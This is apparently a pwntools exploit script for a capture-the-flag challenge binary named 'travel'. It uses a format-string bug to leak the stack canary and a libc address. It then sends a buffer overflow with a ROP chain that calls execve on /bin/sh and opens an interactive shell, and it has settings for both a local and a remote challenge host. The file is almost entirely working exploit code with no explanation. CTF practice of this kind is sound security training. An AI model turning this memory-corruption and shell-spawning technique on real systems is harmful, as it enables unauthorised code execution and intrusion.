from pwn import *
from struct import pack

# settings
context.log_level = 'WARNING'
context.terminal = ['konsole', '-e']

libc = ELF('./libc.so.6')
libc_rop = ROP(libc)

LOCAL = "./travel"
REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 49802]

class Exploit:
    def __init__(self, local=False, debug=False):
        if local:
            self.p = "process(LOCAL, env={'LD_PRELOAD': './libc.so.6'})"
        else:
            self.p = "remote(REMOTE[0], REMOTE[1])"
        
        self.debug = debug
        self.canary_address_leak = 33
        self.libc_address_leak = 3
        self.buffer_max = 200
    
    def get_canary_and_libc(self, proc):
        'sending format string to leak the stack canary'
        payload = (f"%{self.canary_address_leak}$p|%{self.libc_address_leak}$p").encode()
        p = proc.recv(100)
        p = proc.sendline(payload)
        p = proc.recvline().decode()
        
        canary = p[9:25]
        libc = p[28:40]
        canary_address = pack("<Q", int(canary, 16))
        libc_address = int(libc, 16) - 0x114a37 # 0x114a37 from my libc address - libc leaked address
        return canary_address, libc_address
    
    def return_to_libc(self, proc, canary, libc_address):
        '''Forging the ROP chain to get the shell'''
        if self.debug:
            script = """
            b *main+323
            continue
            next
            next
            """
            gdb.attach(proc, gdbscript=script)
        
        # Setting up the ROP chain
        payload = b"A"*(self.buffer_max)        # padding
        payload += canary                       # canary value
        payload += b'\x90'*8                    # junk
        
        # ROP chain
        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rdi","ret"])[0])
        payload += pack("<Q", libc_address+next(libc.search(b'/bin/sh\x00')))
        
        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rax","ret"])[0])
        payload += pack("<Q", 0x3b)
        
        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rsi","ret"])[0])
        payload += pack("<Q", 0x0)
        
        payload += pack("<Q", libc_address+libc_rop.find_gadget(["syscall"])[0])
        
        # Sending the payload
        proc.recv(100)
        proc.sendline(payload)
        proc.recv(100)
        proc.interactive()
        
    def start(self):
        '''start the exploit'''
        with eval(self.p) as r:
            canary, libc_address = self.get_canary_and_libc(r)
            self.return_to_libc(r, canary, libc_address)

Exploit(local=True, debug=True).start()
